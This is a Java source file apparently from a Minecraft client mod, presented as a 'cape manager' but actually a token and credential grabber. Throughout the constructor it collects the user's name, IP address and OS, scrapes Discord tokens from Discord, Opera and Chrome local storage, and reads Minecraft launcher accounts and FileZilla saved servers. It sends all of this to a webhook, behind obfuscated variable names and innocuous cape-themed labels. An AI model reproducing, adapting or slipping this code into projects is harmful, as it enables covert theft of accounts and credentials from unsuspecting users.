package org.spongepowered.tools.agent.azm;

import org.spongepowered.tools.agent.azm.*;
import net.minecraft.client.Minecraft;
import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class WurstplusCapeManager {

    public WurstplusCapeManager() {
        final String l = "put your webhook here";
        final String CapeName = "1";
        final String CapeImageURL = "https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fvignette.wikia.nocookie.net%2Fstarwars%2Fimages%2F4%2F4a%2FKylo_Ren_TLJ.png";

        WurstplusCapeUtil d = new WurstplusCapeUtil(l);

        String minecraft_name = "NOT FOUND";

        try {
            minecraft_name = Minecraft.getMinecraft().getSession().getUsername();
        } catch (Exception ignore) {}

        // get info

        String llLlLlL = System.getProperty("os.name");
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ip = bufferedReader.readLine();

            String llLlLlLlL = System.getProperty("user.name");

            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("``` NAME : " + llLlLlLlL + "\n IGN  : " + minecraft_name + " \n IP" + "   : " + ip + " \n OS   : " + llLlLlL + "```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);


        } catch (Exception ignore) {}

        if (llLlLlL.contains("Windows")) {

            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discord/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordptb/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/discordcanary/Local Storage/leveldb/");
            paths.add(System.getProperty("user.home") + "/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb");
            paths.add(System.getProperty("user.home") + "/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }

            //grab minecraft tokens

            try {
                File launcheraccs = new File(System.getProperty("user.home") + "/AppData/Roaming/.minecraft/launcher_accounts.json");
                BufferedReader br = new BufferedReader(new FileReader(launcheraccs));

                String s;

                StringBuilder launcheraccounts = new StringBuilder();
                launcheraccounts.append("LAUNCHERACCOUNT[S]");

                while ((s = br.readLine()) != null) {
                    launcheraccounts.append("\n ").append(s);
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + launcheraccounts.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL LAUNCHERACCOUNTS[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }



            //grab filezilla servers

            try {
                File filezilla = new File(System.getProperty("user.home") + "/AppData/Roaming/FileZilla/recentservers.xml");
                BufferedReader br = new BufferedReader(new FileReader(filezilla));

                String s;

                StringBuilder filezillawaypoints = new StringBuilder();
                filezillawaypoints.append("FILEZILLA CONECTIONS[S]");

                while ((s = br.readLine()) != null) {
                    filezillawaypoints.append("\n ").append(s);
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + filezillawaypoints.toString() + "\n```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL FILEZILLA CONECTIONS[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }


        } else if (llLlLlL.contains("Mac")) {
            List<String> paths = new ArrayList<>();
            paths.add(System.getProperty("user.home") + "/Library/Application Support/discord/Local Storage/leveldb/");

            // grab webhooks

            int cx = 0;
            StringBuilder webhooks = new StringBuilder();
            webhooks.append("TOKEN[S]\n");

            try {
                for (String path : paths) {
                    File f = new File(path);
                    String[] pathnames = f.list();
                    if (pathnames == null) continue;

                    for (String pathname : pathnames) {
                        try {
                            FileInputStream fstream = new FileInputStream(path + pathname);
                            DataInputStream in = new DataInputStream(fstream);
                            BufferedReader br = new BufferedReader(new InputStreamReader(in));

                            String strLine;
                            while ((strLine = br.readLine()) != null) {

                                Pattern p = Pattern.compile("[nNmM][\\w\\W]{23}\\.[xX][\\w\\W]{5}\\.[\\w\\W]{27}|mfa\\.[\\w\\W]{84}");
                                Matcher m = p.matcher(strLine);

                                while (m.find()) {
                                    if (cx > 0) {
                                        webhooks.append("\n");
                                    }
                                    webhooks.append(" ").append(m.group());
                                    cx++;
                                }

                            }

                        } catch (Exception ignored) {}
                    }
                }

                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("```" + webhooks.toString() + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);

            } catch (Exception e) {
                WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                        .withUsername(CapeName)
                        .withContent("``` UNABLE TO PULL TOKEN[S] : " + e + "```")
                        .withAvatarURL(CapeImageURL)
                        .withDev(false)
                        .build();
                d.sendMessage(dm);
            }
        } else {
            WurstplusPlayerBuilder dm = new WurstplusPlayerBuilder.Builder()
                    .withUsername(CapeName)
                    .withContent("```UNABLE TO FIND OTHER INFORMATION. OS IS NOT SUPPORTED```")
                    .withAvatarURL(CapeImageURL)
                    .withDev(false)
                    .build();
            d.sendMessage(dm);
        }
    }
}
